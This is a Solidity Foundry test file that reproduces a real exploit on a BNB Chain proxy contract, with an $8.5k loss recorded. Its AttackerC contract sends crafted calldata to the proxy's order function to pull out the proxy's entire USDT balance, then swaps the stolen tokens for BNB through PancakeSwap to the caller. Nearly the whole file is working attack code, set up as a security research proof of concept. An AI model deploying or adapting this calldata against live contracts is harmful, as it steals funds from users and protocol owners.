pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : $8.5k
// Attacker : https://bscscan.com/address/0x9f2ecec0145242c094b17807f299ce552a625ac5
// Attack Contract : https://bscscan.com/address/0x9b78b5d9febce2b8868ea6ee2822cb482a85ad74
// Vulnerable Contract : https://bscscan.com/address/0xb7e1d1372f2880373d7c5a931cdbaa73c38663c6
// Attack Tx : https://bscscan.com/tx/0x864d33d006e5c39c9ee8b35be5ae05a2013e556be3e078e2881b0cc6281bb265

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xb7e1d1372f2880373d7c5a931cdbaa73c38663c6

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1860867560885150050
// Twitter Guy : https://x.com/TenArmorAlert/status/1860867560885150050
// Hacking God : N/A

address constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant BEP20USDT = 0x55d398326f99059fF775485246999027B3197955;
address constant ERC1967Proxy = 0xb7E1D1372f2880373d7C5a931cDbAA73C38663C6;
address constant wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant attacker = 0x9f2eceC0145242c094b17807f299Ce552A625ac5;

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 44294726);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", address(attacker).balance, 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        // deal(BEP20USDT, address(attC), 8484920000000000000000);
        attC.attack();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", address(attacker).balance, 18);
        emit log_named_decimal_uint("after attack: balance of address(attC)", IERC20(0x7570FDAd10010A06712cae03D2fC2B3A53640aa4).balanceOf(address(attC)), 18);
    }
}

contract AttackerC {
    constructor() {}

    function attack() external {
        uint256 proxyUsdtBal = IBEP20USDT(BEP20USDT).balanceOf(ERC1967Proxy);
        bytes32 fixedData1 = hex"000001baffffe897231d193affff3120000000e19c552ef6e3cf430838298000";
        bytes memory data = abi.encodePacked(
            bytes4(0x9b3e9b92),
            abi.encode(
                address(BEP20USDT),
                fixedData1,
                uint256(0),
                uint256(1),
                uint256(192),
                uint256(224),
                uint256(0),
                uint256(0)
            )
        );
        (bool c2, ) = ERC1967Proxy.call(data);

        uint256 nextOrderId = IERC1967Proxy(ERC1967Proxy).nextOrderId();
        bytes32 fixedData2 = hex"fffffffffffffffffffffffffffffffffffffffffffffffffffff8cd94b80000";
        bytes memory data2 = abi.encodePacked(
            bytes4(0x9b3e9b92),
            abi.encode(
                address(BEP20USDT),
                fixedData2,
                uint256(0),
                uint256(1),
                uint256(192),
                uint256(256),
                uint256(1),
                nextOrderId,
                uint256(1),
                uint256(proxyUsdtBal)
            )
        );
        (bool c4, ) = ERC1967Proxy.call(data2);

        uint256 selfBal = IBEP20USDT(BEP20USDT).balanceOf(address(this));

        IBEP20USDT(BEP20USDT).approve(PancakeRouter, type(uint256).max);
        
        address[] memory path = new address[](2);
        path[0] = BEP20USDT;
        path[1] = wbnb;
        IPancakeRouter(payable(PancakeRouter)).swapExactTokensForETHSupportingFeeOnTransferTokens(
            selfBal,
            0,
            path,
            tx.origin,
            block.timestamp
        );
    } 
}

interface IERC1967Proxy {
    function nextOrderId() external view returns (uint256);
}

interface IBEP20USDT {
	function balanceOf(address) external returns (uint256);
	function approve(address, uint256) external returns (bool); 
}